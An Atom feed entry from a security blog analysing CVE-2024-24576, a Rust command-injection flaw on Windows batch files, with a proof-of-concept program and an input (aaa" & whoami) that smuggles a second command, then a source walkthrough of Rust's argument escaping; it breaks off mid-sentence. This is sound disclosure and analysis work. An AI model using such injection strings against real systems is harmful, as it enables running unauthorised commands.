<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>程序人生</title>
  
  <subtitle>Fuzzing / Vulnerability / Exploit</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://programlife.net/"/>
  <updated>2024-04-14T15:50:37.000Z</updated>
  <id>https://programlife.net/</id>
  
  <author>
    <name>Ke Liu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2024-24576 Windows 下多语言命令注入漏洞分析</title>
    <link href="https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/"/>
    <id>https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/</id>
    <published>2024-04-14T13:33:37.000Z</published>
    <updated>2024-04-14T15:50:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>近期来自 Flatt Security Inc. 的 RyotaK 披露了 Windows 下多个编程语言的命令注入漏洞（漏洞被命名为 <strong>BatBadBut</strong>），其中 Rust 语言对应的漏洞编号为 CVE-2024-24576，因为 Rust 语言自带流量属性，国内安全/科技自媒体可能会使用一些怪异的标题来进行宣传。实际上，这个漏洞跟内存安全没有关系，是 Windows 下 <code>cmd.exe</code> 对命令行参数的特殊解析逻辑所导致的逻辑漏洞；此外，这个漏洞也不仅仅影响 Rust，像 PHP、Python 等语言均受影响。</p><a id="more"></a><h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01. 漏洞介绍"></a>0x01. 漏洞介绍</h2><h3 id="1-1-CVE-2024-24576"><a href="#1-1-CVE-2024-24576" class="headerlink" title="1.1 CVE-2024-24576"></a>1.1 CVE-2024-24576</h3><p>受影响的 Rust 版本：Rust for Windows &lt; 1.77.2</p><blockquote><p>The Rust Security Response WG was notified that the Rust standard library did not properly escape arguments when invoking batch files (with the <code>bat</code> and <code>cmd</code> extensions) on Windows using the <a href="https://doc.rust-lang.org/std/process/struct.Command.html" target="_blank" rel="noopener"><code>Command</code></a> API. An attacker able to control the arguments passed to the spawned process could execute arbitrary shell commands by bypassing the escaping.</p></blockquote><p>CWE 分类信息：</p><table><thead><tr><th style="text-align:left">CWE-ID</th><th style="text-align:left">CWE Name</th><th style="text-align:left">Source</th></tr></thead><tbody><tr><td style="text-align:left"><a href="http://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78</a></td><td style="text-align:left">Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</td><td style="text-align:left">GitHub, Inc.</td></tr><tr><td style="text-align:left"><a href="http://cwe.mitre.org/data/definitions/88.html" target="_blank" rel="noopener">CWE-88</a></td><td style="text-align:left">Improper Neutralization of Argument Delimiters in a Command (‘Argument Injection’)</td><td style="text-align:left">GitHub, Inc.</td></tr></tbody></table><h3 id="1-2-漏洞影响面"><a href="#1-2-漏洞影响面" class="headerlink" title="1.2 漏洞影响面"></a>1.2 漏洞影响面</h3><p>这个漏洞只存在于 Windows 系统，但不仅仅影响 Rust 语言，像 PHP、Python、Node.js 等均受影响，具体可以参考如下页面：</p><ol><li>CERT/CC: <a href="https://www.kb.cert.org/vuls/id/123335" target="_blank" rel="noopener">Multiple programming languages fail to escape arguments properly in Microsoft Windows</a></li><li>Flatt Security Inc./RyotaK: <a href="https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/" target="_blank" rel="noopener">BatBadBut: You can’t securely execute commands on Windows</a></li></ol><h2 id="0x02-PoC-测试"><a href="#0x02-PoC-测试" class="headerlink" title="0x02. PoC 测试"></a>0x02. PoC 测试</h2><h3 id="2-1-Rust-环境搭建"><a href="#2-1-Rust-环境搭建" class="headerlink" title="2.1 Rust 环境搭建"></a>2.1 Rust 环境搭建</h3><p>从官网下载并运行 <code>rustup-init.exe</code>，默认安装最新版本的 Rust 即 1.77.2，可以通过如下命令安装和切换 Rust 版本：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rustup install <span class="number">1</span>.<span class="number">77</span>.<span class="number">1</span></span><br><span class="line">rustup default <span class="number">1</span>.<span class="number">77</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="2-2-漏洞-PoC"><a href="#2-2-漏洞-PoC" class="headerlink" title="2.2 漏洞 PoC"></a>2.2 漏洞 PoC</h3><p>这个漏洞必须在执行 <code>.bat</code> 或者 <code>.cmd</code> 文件的时候才能触发，所以先准备一个 <code>test.bat</code> 批处理文件，内容如下（作用是打印接收的命令行参数）：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">echo</span> Argument received: %<span class="number">1</span></span><br></pre></td></tr></table></figure><p>测试用的 Rust 文件 <code>test.rs</code> 的代码如下（作用是通过 <code>Command</code> 创建子进程来运行 <code>test.bat</code>，但是子进程的命令行参数是攻击者可以控制的）：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, Write&#125;;</span><br><span class="line"><span class="keyword">use</span> std::process::Command;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"enter payload here"</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> input = <span class="built_in">String</span>::new();</span><br><span class="line">    io::stdout().flush().expect(<span class="string">"Failed to flush stdout"</span>);</span><br><span class="line">    io::stdin().read_line(&amp;<span class="keyword">mut</span> input).expect(<span class="string">"Failed to read from stdin"</span>);</span><br><span class="line">    <span class="keyword">let</span> output = Command::new(<span class="string">"./test.bat"</span>)</span><br><span class="line">                    .arg(input.trim())</span><br><span class="line">                    .output()</span><br><span class="line">                    .expect(<span class="string">"Failed to execute command"</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Output:\n&#123;&#125;"</span>, <span class="built_in">String</span>::from_utf8_lossy(&amp;output.stdout));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC 测试（编译 <code>test.rs</code> 并运行）：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\&gt;<span class="title">rustc</span> <span class="title">test.rs</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">test.exe</span></span></span><br><span class="line"><span class="function"><span class="title">enter</span> <span class="title">payload</span> <span class="title">here</span></span></span><br><span class="line"><span class="function"><span class="title">aaa</span></span></span><br><span class="line"><span class="function"><span class="title">Output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Argument</span> <span class="title">received</span>: <span class="title">aaa</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">test.exe</span></span></span><br><span class="line"><span class="function"><span class="title">enter</span> <span class="title">payload</span> <span class="title">here</span></span></span><br><span class="line"><span class="function"><span class="title">aaa</span> &amp; <span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">Output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Argument</span> <span class="title">received</span>: "<span class="title">aaa</span> &amp; <span class="title">whoami</span>"</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\&gt;<span class="title">test.exe</span></span></span><br><span class="line"><span class="function"><span class="title">enter</span> <span class="title">payload</span> <span class="title">here</span></span></span><br><span class="line"><span class="function"><span class="title">aaa</span>" &amp; <span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">Output</span>:</span></span><br><span class="line"><span class="function"><span class="title">Argument</span> <span class="title">received</span>: "<span class="title">aaa</span>\"</span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-618<span class="title">ia48</span>\<span class="title">ddw</span></span></span><br></pre></td></tr></table></figure><p>可以看到，最后一次测试时成功执行了攻击者注入的命令 <code>whoami</code>。</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03. 漏洞分析"></a>0x03. 漏洞分析</h2><p>根据 <a href="https://github.com/rust-lang/rust/compare/1.77.1...1.77.2" target="_blank" rel="noopener">Rust 1.77.2 &amp; 1.77.1</a> Commit Diff 可知，补丁位于文件 <a href="https://github.com/rust-lang/rust/compare/1.77.1...1.77.2#diff-0f014cb9862d1103d90286b9b9227c5247e14585f796da7c1c189b008dbb6a1a" target="_blank" rel="noopener">library/std/src/sys/pal/windows/args.rs</a>，主要是修复了 <code>make_bat_command_line</code> 函数中的处理逻辑，这里基于 Rust 1.77.1 的代码开展分析。</p><h3 id="3-1-spawn"><a href="#3-1-spawn" class="headerlink" title="3.1 spawn"></a>3.1 spawn</h3><p>首先找到函数 <code>make_bat_command_line</code> 的 caller，为 <a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/process.rs#L262" target="_blank" rel="noopener">library/std/src/sys/pal/windows/process.rs#L262</a> 处的 <code>spawn</code> 函数，其核心代码如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">spawn</span></span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    <span class="keyword">default</span>: Stdio,</span><br><span class="line">    needs_stdin: <span class="built_in">bool</span>,</span><br><span class="line">) -&gt; io::<span class="built_in">Result</span>&lt;(Process, StdioPipes)&gt; &#123;</span><br><span class="line">    <span class="comment">// ------------ cut ------------</span></span><br><span class="line">    <span class="keyword">let</span> program = resolve_exe(&amp;<span class="keyword">self</span>.program, || env::var_os(<span class="string">"PATH"</span>), child_paths)?;</span><br><span class="line">    <span class="comment">// Case insensitive "ends_with" of UTF-16 encoded ".bat" or ".cmd"</span></span><br><span class="line">    <span class="keyword">let</span> is_batch_file = matches!(</span><br><span class="line">        program.len().checked_sub(<span class="number">5</span>).and_then(|i| program.get(i..)),</span><br><span class="line">        <span class="literal">Some</span>([<span class="number">46</span>, <span class="number">98</span> | <span class="number">66</span>, <span class="number">97</span> | <span class="number">65</span>, <span class="number">116</span> | <span class="number">84</span>, <span class="number">0</span>] | [<span class="number">46</span>, <span class="number">99</span> | <span class="number">67</span>, <span class="number">109</span> | <span class="number">77</span>, <span class="number">100</span> | <span class="number">68</span>, <span class="number">0</span>])</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">let</span> (program, <span class="keyword">mut</span> cmd_str) = <span class="keyword">if</span> is_batch_file &#123;</span><br><span class="line">        (</span><br><span class="line">            command_prompt()?,</span><br><span class="line">            args::make_bat_command_line(&amp;program, &amp;<span class="keyword">self</span>.args, <span class="keyword">self</span>.force_quotes_enabled)?,</span><br><span class="line">        )</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cmd_str = make_command_line(&amp;<span class="keyword">self</span>.program, &amp;<span class="keyword">self</span>.args, <span class="keyword">self</span>.force_quotes_enabled)?;</span><br><span class="line">        (program, cmd_str)</span><br><span class="line">    &#125;;</span><br><span class="line">    cmd_str.push(<span class="number">0</span>); <span class="comment">// add null terminator</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------ cut ------------</span></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        cvt(c::CreateProcessW(</span><br><span class="line">            program.as_ptr(),</span><br><span class="line">            cmd_str.as_mut_ptr(),</span><br><span class="line">            ptr::null_mut(),</span><br><span class="line">            ptr::null_mut(),</span><br><span class="line">            c::TRUE,</span><br><span class="line">            flags,</span><br><span class="line">            envp,</span><br><span class="line">            dirp,</span><br><span class="line">            si_ptr,</span><br><span class="line">            &amp;<span class="keyword">mut</span> pi,</span><br><span class="line">        ))</span><br><span class="line">    &#125;?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------ cut ------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果要执行的文件的扩展名（不区分大小写）是 <code>.bat</code> 或者 <code>.cmd</code>，那么 <code>CreateProcessW</code> 的前 <code>2</code> 个参数走的是另一套逻辑：</p><ul><li><code>program</code> 来自 <code>command_prompt()</code>，实际上是 <code>cmd.exe</code> 的绝对路径，这里略过细节</li><li><code>make_bat_command_line</code> 负责拼接命令行参数，是需要重点分析的函数（实际上也是应用补丁的函数）</li></ul><p>如果是普通的程序，则 <code>program</code> 不做特殊处理，而命令行参数由 <code>make_command_line</code> 负责拼接。</p><h3 id="3-2-make-command-line"><a href="#3-2-make-command-line" class="headerlink" title="3.2 make_command_line"></a>3.2 make_command_line</h3><p>先看看正常的文件是怎么构建命令行参数的，函数 <code>make_command_line</code> 的代码如下（<a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/process.rs#L814" target="_blank" rel="noopener">library/std/src/sys/pal/windows/process.rs#L814</a>）：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Produces a wide string *without terminating null*; returns an error if</span></span><br><span class="line"><span class="comment">// `prog` or any of the `args` contain a nul.</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">make_command_line</span></span>(argv0: &amp;OsStr, args: &amp;[Arg], force_quotes: <span class="built_in">bool</span>) -&gt; io::<span class="built_in">Result</span>&lt;<span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="comment">// Encode the command and arguments in a command line string such</span></span><br><span class="line">    <span class="comment">// that the spawned process may recover them using CommandLineToArgvW.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cmd: <span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt; = <span class="built_in">Vec</span>::new();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Always quote the program name so CreateProcess to avoid ambiguity when</span></span><br><span class="line">    <span class="comment">// the child process parses its arguments.</span></span><br><span class="line">    <span class="comment">// Note that quotes aren't escaped here because they can't be used in arg0.</span></span><br><span class="line">    <span class="comment">// But that's ok because file paths can't contain quotes.</span></span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    cmd.extend(argv0.encode_wide());</span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args &#123;</span><br><span class="line">        cmd.push(<span class="string">' '</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">        args::append_arg(&amp;<span class="keyword">mut</span> cmd, arg, force_quotes)?;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">Ok</span>(cmd)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对程序路径本身直接使用双引号 <code>&quot;</code> 包围起来，随后通过 <code>args::append_arg</code> 附加参数。</p><h3 id="3-3-append-arg"><a href="#3-3-append-arg" class="headerlink" title="3.3 append_arg"></a>3.3 append_arg</h3><p>函数 <code>append_arg</code> 位于 <a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/args.rs#L219" target="_blank" rel="noopener">library/std/src/sys/pal/windows/args.rs#L219</a>（和 <code>make_bat_command_line</code> 位于同一个文件，同时也会被 <code>make_bat_command_line</code> 调用），代码如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">append_arg</span></span>(cmd: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt;, arg: &amp;Arg, force_quotes: <span class="built_in">bool</span>) -&gt; io::<span class="built_in">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> (arg, quote) = <span class="keyword">match</span> arg &#123;</span><br><span class="line">        Arg::Regular(arg) =&gt; (arg, <span class="keyword">if</span> force_quotes &#123; Quote::Always &#125; <span class="keyword">else</span> &#123; Quote::Auto &#125;),</span><br><span class="line">        Arg::Raw(arg) =&gt; (arg, Quote::Never),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If an argument has 0 characters then we need to quote it to ensure</span></span><br><span class="line">    <span class="comment">// that it actually gets passed through on the command line or otherwise</span></span><br><span class="line">    <span class="comment">// it will be dropped entirely when parsed on the other end.</span></span><br><span class="line">    ensure_no_nuls(arg)?;</span><br><span class="line">    <span class="keyword">let</span> arg_bytes = arg.as_encoded_bytes();</span><br><span class="line">    <span class="keyword">let</span> (quote, escape) = <span class="keyword">match</span> quote &#123;</span><br><span class="line">        Quote::Always =&gt; (<span class="literal">true</span>, <span class="literal">true</span>),</span><br><span class="line">        Quote::Auto =&gt; &#123;</span><br><span class="line">            (arg_bytes.iter().any(|c| *c == <span class="string">b' '</span> || *c == <span class="string">b'\t'</span>) || arg_bytes.is_empty(), <span class="literal">true</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        Quote::Never =&gt; (<span class="literal">false</span>, <span class="literal">false</span>),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> quote &#123;</span><br><span class="line">        cmd.push(<span class="string">'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> backslashes: <span class="built_in">usize</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> arg.encode_wide() &#123;</span><br><span class="line">        <span class="keyword">if</span> escape &#123;</span><br><span class="line">            <span class="keyword">if</span> x == <span class="string">'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span> &#123;</span><br><span class="line">                backslashes += <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> x == <span class="string">'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span> &#123;</span><br><span class="line">                    <span class="comment">// Add n+1 backslashes to total 2n+1 before internal '"'.</span></span><br><span class="line">                    cmd.extend((<span class="number">0</span>..=backslashes).map(|_| <span class="string">'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                backslashes = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cmd.push(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> quote &#123;</span><br><span class="line">        <span class="comment">// Add n backslashes to total 2n before ending '"'.</span></span><br><span class="line">        cmd.extend((<span class="number">0</span>..backslashes).map(|_| <span class="string">'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span>));</span><br><span class="line">        cmd.push(<span class="string">'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对参数的处理有几种模式：</p><ul><li>普通参数，即 <code>Command::arg</code> 或者 <code>Command::args</code>，<code>Quote</code> 有 <code>Always</code> 和 <code>Auto</code> 两种模式</li><li>原始参数，即 <code>CommandExt::raw_arg</code>，<code>Quote</code> 是 <code>Never</code></li></ul><p>对 Rust 而言，如果使用普通参数，那么 Rust 会帮助对参数字符进行转义处理；而如果使用原始参数，则参数字符的转义由开发者自己负责。对 CVE-2024-24576 这个漏洞而言，是指使用普通参数的情况下，Rust 没有处理好参数的转义，导致引发了注入漏洞。所以这里只看普通参数的场景，<code>quote</code> 和 <code>escape</code> 的可能取值如下：</p><ul><li><code>Quote::Always</code> 模式<ul><li><code>quote = true</code></li><li><code>escape = true</code></li></ul></li><li><code>Quote::Auto</code> 模式<ul><li>如果参数含有空格符 <code></code> 或者制表符 <code>\t</code> 或者参数为空，则 <code>quote = true</code></li><li><code>escape = true</code></li></ul></li></ul><p>参数处理逻辑：</p><ul><li><code>quote</code> 比较好理解，就是前后增加双引号</li><li><code>escape</code> 主要处理两种场景<ul><li>没有前导 <code>\</code> 的双引号 <code>&quot;</code>，转换为 <code>\&quot;</code></li><li>有前导 <code>\</code> 的双引号 <code>&quot;</code>，即 <code>\&quot;</code>，转换为 <code>\\\&quot;</code></li></ul></li></ul><p>对前面的 PoC 而言，给定的参数是 <code>aaa&quot; &amp; whoami</code>，所以这里 <code>quote = true</code>，参数会被转换为 <code>&quot;aaa\&quot; &amp; whoami&quot;</code>，也就是使用双引号包围起来，并完成内部双引号的转义操作。</p><h3 id="3-4-make-bat-command-line"><a href="#3-4-make-bat-command-line" class="headerlink" title="3.4 make_bat_command_line"></a>3.4 make_bat_command_line</h3><p>函数 <code>make_bat_command_line</code> 的代码位于 <a href="https://github.com/rust-lang/rust/blob/1.77.1/library/std/src/sys/pal/windows/args.rs#L265" target="_blank" rel="noopener">library/std/src/sys/pal/windows/args.rs#L265</a>，如下所示：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span>(<span class="keyword">crate</span>) <span class="function"><span class="keyword">fn</span> <span class="title">make_bat_command_line</span></span>(</span><br><span class="line">    script: &amp;[<span class="built_in">u16</span>],</span><br><span class="line">    args: &amp;[Arg],</span><br><span class="line">    force_quotes: <span class="built_in">bool</span>,</span><br><span class="line">) -&gt; io::<span class="built_in">Result</span>&lt;<span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="comment">// Set the start of the command line to `cmd.exe /c "`</span></span><br><span class="line">    <span class="comment">// It is necessary to surround the command in an extra pair of quotes,</span></span><br><span class="line">    <span class="comment">// hence the trailing quote here. It will be closed after all arguments</span></span><br><span class="line">    <span class="comment">// have been added.</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cmd: <span class="built_in">Vec</span>&lt;<span class="built_in">u16</span>&gt; = <span class="string">"cmd.exe /d /c \""</span>.encode_utf16().collect();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Push the script name surrounded by its quote pair.</span></span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">    <span class="comment">// Windows file names cannot contain a `"` character or end with `\\`.</span></span><br><span class="line">    <span class="comment">// If the script name does then return an error.</span></span><br><span class="line">    <span class="keyword">if</span> script.contains(&amp;(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>)) || script.last() == <span class="literal">Some</span>(&amp;(<span class="string">b'\\'</span> <span class="keyword">as</span> <span class="built_in">u16</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">Err</span>(io::const_io_error!(</span><br><span class="line">            io::ErrorKind::InvalidInput,</span><br><span class="line">            <span class="string">"Windows file names may not contain `\"` or end with `\\`"</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">    cmd.extend_from_slice(script.strip_suffix(&amp;[<span class="number">0</span>]).unwrap_or(script));</span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Append the arguments.</span></span><br><span class="line">    <span class="comment">// <span class="doctag">FIXME:</span> This needs tests to ensure that the arguments are properly</span></span><br><span class="line">    <span class="comment">// reconstructed by the batch script by default.</span></span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args &#123;</span><br><span class="line">        cmd.push(<span class="string">' '</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line">        <span class="comment">// Make sure to always quote special command prompt characters, including:</span></span><br><span class="line">        <span class="comment">// * Characters `cmd /?` says require quotes.</span></span><br><span class="line">        <span class="comment">// * `%` for environment variables, as in `%TMP%`.</span></span><br><span class="line">        <span class="comment">// * `|&lt;&gt;` pipe/redirect characters.</span></span><br><span class="line">        <span class="keyword">const</span> SPECIAL: &amp;[<span class="built_in">u8</span>] = <span class="string">b"\t &amp;()[]&#123;&#125;^=;!'+,`~%|&lt;&gt;"</span>;</span><br><span class="line">        <span class="keyword">let</span> force_quotes = <span class="keyword">match</span> arg &#123;</span><br><span class="line">            Arg::Regular(arg) <span class="keyword">if</span> !force_quotes =&gt; &#123;</span><br><span class="line">                arg.as_encoded_bytes().iter().any(|c| SPECIAL.contains(c))</span><br><span class="line">            &#125;</span><br><span class="line">            _ =&gt; force_quotes,</span><br><span class="line">        &#125;;</span><br><span class="line">        append_arg(&amp;<span class="keyword">mut</span> cmd, arg, force_quotes)?;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Close the quote we left opened earlier.</span></span><br><span class="line">    cmd.push(<span class="string">b'"'</span> <span class="keyword">as</span> <span class="built_in">u16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="literal">Ok</span>(cmd)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心逻辑如下：</p><ul><li>首先，把 <code>.bat</code> 或者 <code>.cmd</code> 文件路径转换成如下形式 <code>cmd.exe /d /c &quot;&quot;path&quot; arg1 arg2&quot;</code></li><li>其次，参数处理逻辑如下<ul><li>如果 